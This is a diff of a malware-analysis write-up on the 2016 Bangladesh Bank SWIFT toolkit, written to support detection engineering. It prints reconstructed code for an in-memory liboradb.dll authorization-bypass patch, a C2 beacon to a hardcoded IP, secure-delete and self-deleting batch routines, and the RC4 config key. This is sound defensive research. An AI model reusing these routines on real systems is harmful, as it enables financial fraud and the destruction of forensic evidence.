@@ -1,15 +1,14 @@
-# sentry-bbm-detection
 # SENTRY: From a 2016 Bank Heist to Deployable Detection Rules
-### A Full Technical Walkthrough — Static Analysis, Reverse Engineering, Detection Engineering, and Regulatory Mapping of the Bangladesh Bank SWIFT Toolkit
+### A Full Technical Walkthrough : Static Analysis, Reverse Engineering, Detection Engineering, and Regulatory Mapping of the Bangladesh Bank SWIFT Toolkit
 
 **Author:** Hazem Akkouh
-**Context:** ENSA Kénitra, Morocco — independent technical research project
+**Context:** ENSA Kénitra, Morocco : independent technical research project
 **Companion academic paper:** [link to be added]
 **Full rule set / lab configs / scripts:** [GitHub repo link to be added]
 
 ---
 
-> [PHOTO: A clean cover-image banner — SWIFT logo + a stylized "SENTRY" wordmark, dark security-themed background. This is the LinkedIn-post hero image.]
+> [PHOTO: A clean cover-image banner : SWIFT logo + a stylized "SENTRY" wordmark, dark security-themed background. This is the LinkedIn-post hero image.]
 
 ---
 
@@ -32,13 +31,13 @@
 
 ## 1. The Gap
 
-In February 2016, an attacker came within a few blocked transactions of stealing **$951 million** from the central bank of Bangladesh. They got away with **$81 million**. The malware toolkit that made the theft possible — patching a database library in memory, forging printed transaction confirmations, deleting its own tracks — has been picked apart by some of the best threat intelligence teams in the industry: BAE Systems, Symantec, Kaspersky, the U.S. Department of Justice, and, in 2021, the first (and only) peer-reviewed academic paper on the malware.
+In February 2016, an attacker came within a few blocked transactions of stealing **$951 million** from the central bank of Bangladesh. They got away with **$81 million**. The malware toolkit that made the theft possible : patching a database library in memory, forging printed transaction confirmations, deleting its own tracks : has been picked apart by some of the best threat intelligence teams in the industry: BAE Systems, Symantec, Kaspersky, the U.S. Department of Justice, and, in 2021, the first (and only) peer-reviewed academic paper on the malware.
 
 **None of them shipped a single detection rule.**
 
-Eight years later, if you're a SOC analyst at a bank running SWIFT Alliance Access today, there is no publicly available SIGMA rule, no vendor-neutral detection content, nothing you can drop into your SIEM that says "this specific, well-documented attack pattern is happening right now." The IOCs from 2016 — a dead C2 IP, some file hashes — are useless against anyone who changes a byte. The behavior never got translated into something durable.
+Eight years later, if you're a SOC analyst at a bank running SWIFT Alliance Access today, there is no publicly available SIGMA rule, no vendor-neutral detection content, nothing you can drop into your SIEM that says "this specific, well-documented attack pattern is happening right now." The IOCs from 2016 : a dead C2 IP, some file hashes : are useless against anyone who changes a byte. The behavior never got translated into something durable.
 
-This project closes that gap. What follows is the complete technical record: static analysis, full Ghidra reverse engineering (function by function, byte by byte), attribution reasoning, IOC tables, 30+ novel findings not in any prior public report, 8 working SIGMA rules validated against a real (simulated) environment, and a mapping of everything back to the regulatory frameworks — SWIFT CSCF, Morocco's DNSSI, Bank Al-Maghrib's pentesting directive, ISO 27002 — that a real institution would actually be held to.
+This project closes that gap. What follows is the complete technical record: static analysis, full Ghidra reverse engineering (function by function, byte by byte), attribution reasoning, IOC tables, 30+ novel findings not in any prior public report, 8 working SIGMA rules validated against a real (simulated) environment, and a mapping of everything back to the regulatory frameworks : SWIFT CSCF, Morocco's DNSSI, Bank Al-Maghrib's pentesting directive, ISO 27002 : that a real institution would actually be held to.
 
 > [PHOTO: The BAE Systems "Two Bytes to $951m" blog post screenshot, or a simple infographic: $951M attempted → $81M stolen → $0 detection rules published in 8 years. This is the hook visual.]
 
@@ -50,10 +49,10 @@ This project closes that gap. What follows is the complete technical record: sta
 
 | Filename | SHA-256 | Size | Role |
 |---|---|---|---|
-| `evtdiag.exe` | `4659dadb...c98959a` | 65,536 B | Main engine — SQL manipulation, memory patching, printing, C2, cleanup |
-| `evtsys.exe` | (referenced via evtdiag XREFs) | 16,384 B | Secure-delete "killer" utility — destroys evtdiag.exe and itself |
-| `nroff_b.exe` | SHA-1 `70bf1659...f60e4eeb` | 24,576 B | Message demultiplexer — batch → per-message files |
-| `gpca.dat` | `b07b37f0...8e68fef7` | 33,848 B | RC4-encrypted config: filter list, paths, C2 IP — **this is a config artifact belonging to evtdiag.exe, not a fifth independent tool** |
+| `evtdiag.exe` | `4659dadb...c98959a` | 65,536 B | Main engine : SQL manipulation, memory patching, printing, C2, cleanup |
+| `evtsys.exe` | (referenced via evtdiag XREFs) | 16,384 B | Secure-delete "killer" utility : destroys evtdiag.exe and itself |
+| `nroff_b.exe` | SHA-1 `70bf1659...f60e4eeb` | 24,576 B | Message demultiplexer : batch → per-message files |
+| `gpca.dat` | `b07b37f0...8e68fef7` | 33,848 B | RC4-encrypted config: filter list, paths, C2 IP : **this is a config artifact belonging to evtdiag.exe, not a fifth independent tool** |
 
 The 16-byte RC4 key that decrypts `gpca.dat` is hardcoded in `evtdiag.exe`'s `.data` section at offset `0x40F020`:
 
@@ -61,19 +60,19 @@ The 16-byte RC4 key that decrypts `gpca.dat` is hardcoded in `evtdiag.exe`'s `.d
 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF
 ```
 
-> [PHOTO: CyberChef screenshot showing the RC4 decryption recipe and the decrypted gpca.dat output — you already have this from the RE report.]
+> [PHOTO: CyberChef screenshot showing the RC4 decryption recipe and the decrypted gpca.dat output : you already have this from the RE report.]
 
 ### 2.2 The Three-Binary Architecture
 
 The three executables form a coordinated attack surface, not three independent tools:
 
 - **`nroff_b.exe`** transforms Alliance Access's batched message output into a per-message format that
-- **`evtdiag.exe`** can consume and act on (the operational engine — patching, SQL, printing, C2), and
+- **`evtdiag.exe`** can consume and act on (the operational engine : patching, SQL, printing, C2), and
 - **`evtsys.exe`** destroys `evtdiag.exe` when the operation ends.
 
-> [SCHEMA: Insert the "Three-Binary Attack Architecture" diagram here — the box-and-arrow diagram from the RE report showing SWIFT Alliance Access → Alliance directories (mcm/mcp/mcs/mcf) → evtdiag.exe ↔ liboradb.dll / Oracle DB / C2 Server, with nroff_b.exe and evtsys.exe as satellite processes. Redraw this yourself rather than reusing any existing figure directly, to keep it clean for both LinkedIn and GitHub.]
+> [SCHEMA: Insert the "Three-Binary Attack Architecture" diagram here : the box-and-arrow diagram from the RE report showing SWIFT Alliance Access → Alliance directories (mcm/mcp/mcs/mcf) → evtdiag.exe ↔ liboradb.dll / Oracle DB / C2 Server, with nroff_b.exe and evtsys.exe as satellite processes. Redraw this yourself rather than reusing any existing figure directly, to keep it clean for both LinkedIn and GitHub.]
 
-**How they got installed together:** `evtdiag`'s cleanup code calls `GetModuleFileNameA` to obtain its own path, strips the filename, and appends `evtsys.exe` — enforcing that both binaries live in the same directory. Neither binary contains self-installation code; the Windows service (`diagsysevt`) and initial file placement were performed by an upstream loader outside this analysis's scope — almost certainly the NESTEGG backdoor documented separately by the DOJ.
+**How they got installed together:** `evtdiag`'s cleanup code calls `GetModuleFileNameA` to obtain its own path, strips the filename, and appends `evtsys.exe` : enforcing that both binaries live in the same directory. Neither binary contains self-installation code; the Windows service (`diagsysevt`) and initial file placement were performed by an upstream loader outside this analysis's scope : almost certainly the NESTEGG backdoor documented separately by the DOJ.
 
 ### 2.3 The Operational Timeline
 
@@ -85,9 +84,9 @@ All three binaries were compiled in a tight **46-hour window**:
 | nroff_b.exe | Fri Feb 05 2016, 08:55:19 | ~21 hours |
 | evtdiag.exe | Fri Feb 05 2016, 11:46:20 | ~18.2 hours |
 
-The kill switch fires at **2016-02-06 06:00 local time**. The main operational binary was compiled less than 18 hours before the operation was designed to end. This is not the signature of a team that tested carefully over months — it reads as a rushed final build, plausibly incorporating last-minute reconnaissance about the victim environment.
+The kill switch fires at **2016-02-06 06:00 local time**. The main operational binary was compiled less than 18 hours before the operation was designed to end. This is not the signature of a team that tested carefully over months : it reads as a rushed final build, plausibly incorporating last-minute reconnaissance about the victim environment.
 
-> [SCHEMA: Insert the "Operational Timeline" flowchart from the RE report — compile times → fraudulent transactions sent → kill switch fires → cleanup chain executes.]
+> [SCHEMA: Insert the "Operational Timeline" flowchart from the RE report : compile times → fraudulent transactions sent → kill switch fires → cleanup chain executes.]
 
 ### 2.4 The Environment the Malware Assumes
 
@@ -97,9 +96,9 @@ Every path is built at startup from a template string at `.data:0x40F0A4`:
 %c:\Users\%s\AppData\Local\%s
 ```
 
-- `%c` — root drive letter (runtime-detected)
-- `%s` — hardcoded username: **Administrator** (`.data:0x40F0C4`)
-- `%s` — hardcoded subdirectory: **Allians** (`.data:0x40F0D4`) — note the misspelling; the real SWIFT install directory is "Alliance"
+- `%c` : root drive letter (runtime-detected)
+- `%s` : hardcoded username: **Administrator** (`.data:0x40F0C4`)
+- `%s` : hardcoded subdirectory: **Allians** (`.data:0x40F0D4`) : note the misspelling; the real SWIFT install directory is "Alliance"
 
 **This gives a base directory of:** `[ROOT]:\Users\Administrator\AppData\Local\Allians\`
 
@@ -109,35 +108,35 @@ Every path is built at startup from a template string at `.data:0x40F0A4`:
 
 | Subdir | Purpose | Code reference |
 |---|---|---|
-| `mcm\` | Message store — primary FIN messages | `.data:0x40F068` |
-| `mcp\` | Message processing — post-processed | `.data:0x40F09C` |
+| `mcm\` | Message store : primary FIN messages | `.data:0x40F068` |
+| `mcp\` | Message processing : post-processed | `.data:0x40F09C` |
 | `mcs\` | Message state | `.data:0x40F08C` |
-| `mcf\` | **Fourth monitored directory — not documented in BAE 2016** | `.data:0x40F0A0` |
+| `mcf\` | **Fourth monitored directory : not documented in BAE 2016** | `.data:0x40F0A0` |
 
 **Files the malware creates and uses:**
 
 | File | Purpose | Encryption |
 |---|---|---|
 | `gpca.dat` | Config file | RC4 |
-| `recas.dat` | Log file | **None — plaintext** (see Section 6 for why this corrects prior published claims) |
+| `recas.dat` | Log file | **None : plaintext** (see Section 6 for why this corrects prior published claims) |
 | `%TEMP%\evchk.bat` | Dropped self-delete batch | None |
 | `nroff.exe.bak` | Backup of legitimate nroff | N/A |
 
-**The Windows service:** registered under key **`diagsysevt`**, but at runtime the malware passes **`evtsys.exe`** as the `lpServiceName` argument to `StartServiceCtrlDispatcherA` — the exact name of a legitimate Windows binary in System32 (the real Windows Event System service is served by `evtsvc.exe` — close enough to fool a casual glance in Process Explorer).
+**The Windows service:** registered under key **`diagsysevt`**, but at runtime the malware passes **`evtsys.exe`** as the `lpServiceName` argument to `StartServiceCtrlDispatcherA` : the exact name of a legitimate Windows binary in System32 (the real Windows Event System service is served by `evtsvc.exe` : close enough to fool a casual glance in Process Explorer).
 
-**The C2 server:** one hardcoded IP, `196.202.103.174`, port 80, plaintext HTTP. Long dead — do not build detection around this literal value; see Section 7 for the behavioral alternative.
+**The C2 server:** one hardcoded IP, `196.202.103.174`, port 80, plaintext HTTP. Long dead : do not build detection around this literal value; see Section 7 for the behavioral alternative.
 
 ---
 
 ## 3. Ghidra Deep-Dive
 
-> A note on method, stated plainly: this section goes beyond what any prior public analysis of this toolkit has documented — more functions named, more mechanisms explained, more cross-binary connections drawn. That's worth stating clearly, but it comes with an equally clear caveat: this analysis benefited from modern tooling (Ghidra's decompiler) and was conducted years after the original researchers worked under active incident-response pressure and disclosure constraints. What they produced under those conditions was, frankly, extraordinary. Reading raw Ghidra decompilation where every variable is `local_10` and every function is `FUN_00402580` — and making sense of it — is a skill that takes years. The goal of this section is to build understanding, not to claim precedence.
+> A note on method, stated plainly: this section goes beyond what any prior public analysis of this toolkit has documented : more functions named, more mechanisms explained, more cross-binary connections drawn. That's worth stating clearly, but it comes with an equally clear caveat: this analysis benefited from modern tooling (Ghidra's decompiler) and was conducted years after the original researchers worked under active incident-response pressure and disclosure constraints. What they produced under those conditions was, frankly, extraordinary. Reading raw Ghidra decompilation where every variable is `local_10` and every function is `FUN_00402580` : and making sense of it : is a skill that takes years. The goal of this section is to build understanding, not to claim precedence.
 
-### 3.1 The Service Main Loop — `FUN_00409af0`
+### 3.1 The Service Main Loop : `FUN_00409af0`
 
 This function runs after the Windows service starts, called from the CLI dispatcher's `-svc` branch. It orchestrates the entire attack: init, wait for user login, patch, spawn background thread, loop, cleanup.
 
-> [SCHEMA: Insert the two-part flowchart from the RE report — "Startup Phase" (init globals → load config → poll for login → patch liboradb → spawn C2 beacon) and "Main Loop + Cleanup" (PRT cleanup → housekeeping → Oracle sync → SWIFT process → kill-switch check → cleanup chain).]
+> [SCHEMA: Insert the two-part flowchart from the RE report : "Startup Phase" (init globals → load config → poll for login → patch liboradb → spawn C2 beacon) and "Main Loop + Cleanup" (PRT cleanup → housekeeping → Oracle sync → SWIFT process → kill-switch check → cleanup chain).]
 
 **Reconstructed pseudocode (real function/variable names restored):**
 
@@ -221,9 +220,9 @@ DWORD ServiceMain(void)
 }
 ```
 
-**Novel observation — service-mode gating:** the liboradb.dll patch install is gated on a flag that is only set when the binary is invoked with `-svc` AND the SCM successfully registers the service handler. If you run `evtdiag.exe` directly from a shell without `-svc`, **the patch is skipped**. This means the CLI commands (`-i`, `-u`, `-t`, `-p`, `-g`, `-r`, `-s`) do not automatically patch the DLL — only the fully-installed service path does. This gating is not documented in prior public writeups.
+**Novel observation : service-mode gating:** the liboradb.dll patch install is gated on a flag that is only set when the binary is invoked with `-svc` AND the SCM successfully registers the service handler. If you run `evtdiag.exe` directly from a shell without `-svc`, **the patch is skipped**. This means the CLI commands (`-i`, `-u`, `-t`, `-p`, `-g`, `-r`, `-s`) do not automatically patch the DLL : only the fully-installed service path does. This gating is not documented in prior public writeups.
 
-**Novel observation — the ST-N state machine:** four log strings form an internal lifecycle tracker written to `recas.dat`:
+**Novel observation : the ST-N state machine:** four log strings form an internal lifecycle tracker written to `recas.dat`:
 
 | State | Meaning |
 |---|---|
@@ -233,13 +232,13 @@ DWORD ServiceMain(void)
 | ST-3 | Patch installed, main loop running |
 | ST-100 | Shutdown initiated (kill switch or STOP) |
 
-Nobody has enumerated these in prior public analysis. They give operators — and analysts — a lifecycle map.
+Nobody has enumerated these in prior public analysis. They give operators : and analysts : a lifecycle map.
 
-### 3.2 The Kill Switch — `FUN_00409230`
+### 3.2 The Kill Switch : `FUN_00409230`
 
 The single most damning finding in the binary: a hardcoded date comparison that says the operation must be over by **06:00 on February 6, 2016**.
 
-**Before — raw Ghidra decompilation:**
+**Before : raw Ghidra decompilation:**
 
 ```c
 int FUN_00409230(void)
@@ -294,13 +293,13 @@ LAB_00409271:
 004022af c3                RET
 ```
 
-The four constants (**2016, 2, 6, 6**) are visible directly in the disassembly as immediate operands to CMP instructions. This is not interpretation — it is byte-level fact. Any reviewer with the same binary can verify it in under a minute. This is the strongest, most defensible single finding in the entire malware family.
+The four constants (**2016, 2, 6, 6**) are visible directly in the disassembly as immediate operands to CMP instructions. This is not interpretation : it is byte-level fact. Any reviewer with the same binary can verify it in under a minute. This is the strongest, most defensible single finding in the entire malware family.
 
 Because this function is called every second from the main loop's `Sleep(1000)` cycle, the malware polls at 1-second granularity. From 06:00:00 onward, the very next iteration returns 1, and the cleanup chain begins immediately.
 
-**The developer knew exactly how long the operation needed to run — and typed that date into the binary by hand.**
+**The developer knew exactly how long the operation needed to run : and typed that date into the binary by hand.**
 
-### 3.3 The liboradb.dll Patch — `FUN_00402580`
+### 3.3 The liboradb.dll Patch : `FUN_00402580`
 
 The single most operationally significant act of the malware: patching 2 bytes in memory inside every process that has `liboradb.dll` loaded, disabling a specific authorization check inside SWIFT Alliance Access's Oracle database client library.
 
@@ -318,7 +317,7 @@ The malware overwrites them with:
 
 The effect: the conditional-jump instruction that normally skips a failure-handling branch when a permission check passes is replaced with two NOPs, so the fall-through (success) path is taken unconditionally. Whatever check preceded this JNZ is now effectively bypassed.
 
-**Before — Ghidra decompilation of the patcher:**
+**Before : Ghidra decompilation of the patcher:**
 
 ```c
 undefined4 FUN_00402580(HANDLE hProc, DWORD moduleBase, int direction)
@@ -338,7 +337,7 @@ undefined4 FUN_00402580(HANDLE hProc, DWORD moduleBase, int direction)
 
   ReadProcessMemory(hProc, moduleBase + 0x6a8b6, currentBytes, 2, &bytesRead);
   if (memcmp(currentBytes, expectedBytes, 2) != 0)
-    return 0xffffffff;    // wrong bytes — refuse to patch
+    return 0xffffffff;    // wrong bytes : refuse to patch
 
   VirtualProtectEx(hProc, moduleBase + 0x6a8b6, 2, PAGE_EXECUTE_READWRITE, &oldProtect);
   WriteProcessMemory(hProc, moduleBase + 0x6a8b6, targetBytes, 2, &bytesWritten);
@@ -348,25 +347,25 @@ undefined4 FUN_00402580(HANDLE hProc, DWORD moduleBase, int direction)
 }
 ```
 
-**Novel finding — the bidirectional patch design:** the function supports both install (`direction=1`) and uninstall (`direction=0`), and refuses to write unless the current bytes match the expected "before" state — making the operation idempotent and non-destructive. This means operators could cleanly remove the patch on demand via the `-u` CLI flag. Prior public reports describe the patch only as "install-only." The uninstall path is documented here because both directions are exposed as CLI flags.
+**Novel finding : the bidirectional patch design:** the function supports both install (`direction=1`) and uninstall (`direction=0`), and refuses to write unless the current bytes match the expected "before" state : making the operation idempotent and non-destructive. This means operators could cleanly remove the patch on demand via the `-u` CLI flag. Prior public reports describe the patch only as "install-only." The uninstall path is documented here because both directions are exposed as CLI flags.
 
-**How the patcher finds its targets — `FUN_004023b0`:**
+**How the patcher finds its targets : `FUN_004023b0`:**
 
 1. Adjust own token to grant **SeDebugPrivilege** (needed for `OpenProcess` of foreign processes)
 2. `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)` to enumerate all running processes
 3. For each `Process32Next` result:
-   a. `OpenProcess(PROCESS_ALL_ACCESS = 0x1F0FFF)` — heavier than needed
+   a. `OpenProcess(PROCESS_ALL_ACCESS = 0x1F0FFF)` : heavier than needed
    b. `Module32Next` through the target's modules
    c. If `StrStrIA(moduleName, "liboradb.dll")` matches: call the patcher, increment found/patched counters
 4. Print `"PI (found, patched)"` or `"PU (found, unpatched)"`
 
-> ⚠️ **Detection surface, worth flagging explicitly:** the use of `PROCESS_ALL_ACCESS (0x1F0FFF)` is heavier than needed for a memory patch — `PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION` would suffice. Legitimate patching tools normally request the minimum required rights. This over-broad access request is exactly what SENTRY Rule 1 (Section 7) detects.
+> ⚠️ **Detection surface, worth flagging explicitly:** the use of `PROCESS_ALL_ACCESS (0x1F0FFF)` is heavier than needed for a memory patch : `PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION` would suffice. Legitimate patching tools normally request the minimum required rights. This over-broad access request is exactly what SENTRY Rule 1 (Section 7) detects.
 
-### 3.4 The C2 Beacon — `FUN_00408f40` and `LAB_00409130`
+### 3.4 The C2 Beacon : `FUN_00408f40` and `LAB_00409130`
 
 Two parts: the transmitter (sends one GET request) and the background thread (decides when to send and what payload).
 
-**The transmitter — reconstructed:**
+**The transmitter : reconstructed:**
 
 ```c
 // Send a single HTTP GET beacon to the hardcoded C2 server.
@@ -411,9 +410,9 @@ DWORD SendC2Beacon(const char *payload)
 
 **The beacon thread:**
 
-> [SCHEMA: Insert the "C2 Beacon Thread" flowchart from the RE report — sleep 30s → poll payload queue → send immediately if queued, else sleep 1s → every 3600s check login state → send ---O/---C/---N marker → loop until shutdown.]
+> [SCHEMA: Insert the "C2 Beacon Thread" flowchart from the RE report : sleep 30s → poll payload queue → send immediately if queued, else sleep 1s → every 3600s check login state → send ---O/---C/---N marker → loop until shutdown.]
 
-**Novel finding — two details beyond BAE's "hourly beacon" description:**
+**Novel finding : two details beyond BAE's "hourly beacon" description:**
 
 1. **A payload queue** (`FUN_00403020`, max 511 bytes) is polled **every second**. If a payload is queued by other functions, it is sent **immediately** without waiting for the hour to elapse. This is exfiltration, not just heartbeat.
 2. **Two independent login-state probes** (one for current-login, one for prior-login) drive the three-marker output (`---O` / `---C` / `---N`), letting the operator detect not just "is logged in" but also **"just logged out."**
@@ -422,11 +421,11 @@ DWORD SendC2Beacon(const char *payload)
 
 When the main loop exits (kill switch or STOP command), a **five-stage cleanup sequence** runs. By the time it completes: no binaries, no config, no log, no service registration.
 
-> [SCHEMA: Insert the full "Self-Cleanup Chain" diagram from the RE report — kill switch fires → log ST-100, sleep 10s → SecureDelete(gpca.dat) → SecureDelete(recas.dat) → DeleteService(diagsysevt) → build "evtsys.exe" <path> command → CreateProcessA → ExitProcess → evtsys retry loop (up to 50x) → evtsys self-delete via evchk.bat → end state: nothing survives.]
+> [SCHEMA: Insert the full "Self-Cleanup Chain" diagram from the RE report : kill switch fires → log ST-100, sleep 10s → SecureDelete(gpca.dat) → SecureDelete(recas.dat) → DeleteService(diagsysevt) → build "evtsys.exe" <path> command → CreateProcessA → ExitProcess → evtsys retry loop (up to 50x) → evtsys self-delete via evchk.bat → end state: nothing survives.]
 
-**The evtsys spawner — `FUN_00409300`, the cleverest piece of the chain:**
+**The evtsys spawner : `FUN_00409300`, the cleverest piece of the chain:**
 
-A running `.exe` holds a lock on itself, so `evtdiag` cannot delete its own file. The solution: spawn `evtsys.exe` (a separate binary) with `evtdiag`'s own file path as an argument, then immediately `ExitProcess`, releasing the lock — before `evtsys` tries to delete it.
+A running `.exe` holds a lock on itself, so `evtdiag` cannot delete its own file. The solution: spawn `evtsys.exe` (a separate binary) with `evtdiag`'s own file path as an argument, then immediately `ExitProcess`, releasing the lock : before `evtsys` tries to delete it.
 
 ```c
 // Final stage of self-cleanup: launch evtsys.exe with our own path as
@@ -457,15 +456,15 @@ void SpawnEvtsysAndExit(HMODULE hSelf)
 }
 ```
 
-**Novel finding — the handoff trick:** `evtsys` is designed with a retry loop (up to 50 attempts, 1 second apart) *precisely because* it expects to find `evtdiag`'s file still locked when it first tries. This tight coupling proves the two binaries were designed together, not repurposed independently.
+**Novel finding : the handoff trick:** `evtsys` is designed with a retry loop (up to 50 attempts, 1 second apart) *precisely because* it expects to find `evtdiag`'s file still locked when it first tries. This tight coupling proves the two binaries were designed together, not repurposed independently.
 
 ### 3.6 The PRT Doctor-Then-Destroy Pipeline
 
 The print-manipulation subsystem. Runs continuously, scanning three directories every second, doctoring any print-job (`.prt`) file it finds, then destroying the original.
 
-> [SCHEMA: Insert the "PRT Doctor-Then-Destroy Pipeline" diagram — dispatcher (3 parallel dir scans) → FindFirstFile 4-char filenames → parse content using _DO_NOT_USE_MM_ sentinel → write doctored PRT with nroff-macro templates → secure-delete original.]
+> [SCHEMA: Insert the "PRT Doctor-Then-Destroy Pipeline" diagram : dispatcher (3 parallel dir scans) → FindFirstFile 4-char filenames → parse content using _DO_NOT_USE_MM_ sentinel → write doctored PRT with nroff-macro templates → secure-delete original.]
 
-**The message-block extractor — `FUN_00401cd0`:**
+**The message-block extractor : `FUN_00401cd0`:**
 
 ```c
 // Extract one message-block delimited by nroff-comment sentinels
@@ -491,11 +490,11 @@ LPSTR ExtractSentinelBlock(LPCSTR input, basic_string<> *out)
 }
 ```
 
-**Novel finding:** this sentinel (`.\" " _DO_NOT_USE_MM_`) is a shared block-boundary convention used identically by both the print-output parser and the SWIFT-message-file parser (`.prc`/`.fal`) — 5 XREFs across two subsystems. Because `nroff` (the legitimate SWIFT print formatter) treats lines starting with `.\"` as comments and strips them from printed output, the sentinel is invisible when the file actually prints, but parseable when the raw file is read from disk. The malware's job is to consume the legitimate `nroff.exe`'s own output convention.
+**Novel finding:** this sentinel (`.\" " _DO_NOT_USE_MM_`) is a shared block-boundary convention used identically by both the print-output parser and the SWIFT-message-file parser (`.prc`/`.fal`) : 5 XREFs across two subsystems. Because `nroff` (the legitimate SWIFT print formatter) treats lines starting with `.\"` as comments and strips them from printed output, the sentinel is invisible when the file actually prints, but parseable when the raw file is read from disk. The malware's job is to consume the legitimate `nroff.exe`'s own output convention.
 
-### 3.7 The Secure-Delete Workhorse — `FUN_00401640`
+### 3.7 The Secure-Delete Workhorse : `FUN_00401640`
 
-Called **19 times** across `evtdiag` — the single most-used non-trivial primitive in the binary.
+Called **19 times** across `evtdiag` : the single most-used non-trivial primitive in the binary.
 
 ```c
 // Zero-fill a file's contents in 4KB chunks over its full length, then
@@ -535,9 +534,9 @@ DWORD SecureDelete(const char *path)
 }
 ```
 
-**Finding:** this function is **structurally identical** to `FUN_004010f0` in `evtsys.exe` — same stack size (0x1014), same probe-write pattern, same 4KB overwrite loop, same hand-off to rename+delete. Two independent copies of the same algorithm in two binaries = shared source codebase. See Section 4 for the full attribution argument this feeds into.
+**Finding:** this function is **structurally identical** to `FUN_004010f0` in `evtsys.exe` : same stack size (0x1014), same probe-write pattern, same 4KB overwrite loop, same hand-off to rename+delete. Two independent copies of the same algorithm in two binaries = shared source codebase. See Section 4 for the full attribution argument this feeds into.
 
-**The random-rename + delete — `FUN_00401000`:**
+**The random-rename + delete : `FUN_00401000`:**
 
 ```c
 DWORD RenameRandomAndDelete(const char *path, bool isDir)
@@ -565,13 +564,13 @@ DWORD RenameRandomAndDelete(const char *path, bool isDir)
 }
 ```
 
-> **Forensic note:** this rename-then-delete technique defeats naive filename-based forensic scanning of the MFT. It does **not** defeat `$UsnJrnl` analysis, which records the original filename in a `RENAME_OLD_NAME` entry — the malware does not attempt to suppress `$UsnJrnl`, which would require kernel privileges and direct volume manipulation. The rename is an anti-forensics measure effective against first-responder triage, not against a full forensic investigation.
+> **Forensic note:** this rename-then-delete technique defeats naive filename-based forensic scanning of the MFT. It does **not** defeat `$UsnJrnl` analysis, which records the original filename in a `RENAME_OLD_NAME` entry : the malware does not attempt to suppress `$UsnJrnl`, which would require kernel privileges and direct volume manipulation. The rename is an anti-forensics measure effective against first-responder triage, not against a full forensic investigation.
 
-### 3.8 evtsys.exe — The Killer, Full Internals
+### 3.8 evtsys.exe : The Killer, Full Internals
 
 A minimal, purpose-built utility. 6 flagged imports, 19 functions total, 16 KB. Its sole job: destroy a file it is pointed at, then destroy itself.
 
-> [SCHEMA: Insert the "evtsys.exe Execution Flow" diagram — argc check → SecureOverwriteAndDelete(argv[1]) → retry up to 50x with 1s sleep → self-delete via evchk.bat.]
+> [SCHEMA: Insert the "evtsys.exe Execution Flow" diagram : argc check → SecureOverwriteAndDelete(argv[1]) → retry up to 50x with 1s sleep → self-delete via evchk.bat.]
 
 ```c
 DWORD main(int argc, char **argv)
@@ -589,7 +588,7 @@ DWORD main(int argc, char **argv)
 }
 ```
 
-**The self-delete via `evchk.bat` — the batch-obfuscation trick:**
+**The self-delete via `evchk.bat` : the batch-obfuscation trick:**
 
 ```c
 void SelfDeleteViaEvchkBat(void)
@@ -633,11 +632,11 @@ void SelfDeleteViaEvchkBat(void)
 }
 ```
 
-**The `PING 0.0.0.0 > nul` idiom is a portable "sleep"** — while PING waits for a timeout on the unreachable address, `evtsys.exe` finishes exiting and its file lock releases. Then `IF EXIST` fails, the loop exits, and `DEL "%0"` deletes the batch file itself. Nothing survives.
+**The `PING 0.0.0.0 > nul` idiom is a portable "sleep"** : while PING waits for a timeout on the unreachable address, `evtsys.exe` finishes exiting and its file lock releases. Then `IF EXIST` fails, the loop exits, and `DEL "%0"` deletes the batch file itself. Nothing survives.
 
-### 3.9 nroff_b.exe — The Demultiplexer, Full Internals
+### 3.9 nroff_b.exe : The Demultiplexer, Full Internals
 
-Its filename references the legitimate SWIFT print utility "nroff," but it has nothing to do with printing — it's a message **demultiplexer**: reads batched SWIFT message files, splits them into individual messages, sorts them into per-message-type subdirectories, and destroys the originals.
+Its filename references the legitimate SWIFT print utility "nroff," but it has nothing to do with printing : it's a message **demultiplexer**: reads batched SWIFT message files, splits them into individual messages, sorts them into per-message-type subdirectories, and destroys the originals.
 
 **Shared string constants confirming a common source tree with `evtdiag`:**
 
@@ -655,8 +654,8 @@ Its filename references the legitimate SWIFT print utility "nroff," but it has n
 |---|---|---|---|
 | 950 | 0x3B6 | MT950 | Statement Message (account statement) |
 | 515 | 0x203 | MT515 | Client Advice of Purchase/Sale |
-| — | — | NAK | Negative acknowledgment (routed to NAK subdir) |
-| — | — | Swift Input/Output | Generic incoming/outgoing (routed to \Incoming\ / \Outgoing\) |
+| : | : | NAK | Negative acknowledgment (routed to NAK subdir) |
+| : | : | Swift Input/Output | Generic incoming/outgoing (routed to \Incoming\ / \Outgoing\) |
 
 **Finding:** `nroff_b`'s role in the attack is to transform Alliance Access's raw batched output into pre-organized per-message-type files that `evtdiag` can then walk directly, rather than re-parsing batches from scratch on every scan.
 
@@ -672,10 +671,10 @@ The 16-byte sequence `4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF` appears v
 
 | Binary | Address | XREFs from executable code |
 |---|---|---|
-| evtdiag.exe | `.data:0x40F200` | 1 — the config loader |
-| evtsys.exe | `.data:0x403010` | **0** — sits in `.data` with no code references |
+| evtdiag.exe | `.data:0x40F200` | 1 : the config loader |
+| evtsys.exe | `.data:0x403010` | **0** : sits in `.data` with no code references |
 
-The key is *used* in evtdiag (to decrypt gpca.dat) and *vestigial* in evtsys (present but unreferenced by any function). The most natural explanation: both were compiled from a shared source tree that included a common cryptography module, included via a shared header or `.c` module that evtsys links but never calls. This is a stronger attribution signal than merely "same algorithm" — it is literally the same key bytes at a named `.data` symbol in two separate PE files.
+The key is *used* in evtdiag (to decrypt gpca.dat) and *vestigial* in evtsys (present but unreferenced by any function). The most natural explanation: both were compiled from a shared source tree that included a common cryptography module, included via a shared header or `.c` module that evtsys links but never calls. This is a stronger attribution signal than merely "same algorithm" : it is literally the same key bytes at a named `.data` symbol in two separate PE files.
 
 ### 4.2 Cloned Secure-Delete Implementation
 
@@ -690,7 +689,7 @@ The key is *used* in evtdiag (to decrypt gpca.dat) and *vestigial* in evtsys (pr
 | Post-overwrite | Call rename+delete | Same |
 | Rename algorithm | `'a' + rand()%26` per char | Same |
 
-This is not "same algorithm at the pseudocode level" — it is the same implementation details: same stack size, same buffer-init idiom, same probe pattern, same chunk size, same post-overwrite hand-off structure. Copy-paste from a shared `.c` file or static library.
+This is not "same algorithm at the pseudocode level" : it is the same implementation details: same stack size, same buffer-init idiom, same probe pattern, same chunk size, same post-overwrite hand-off structure. Copy-paste from a shared `.c` file or static library.
 
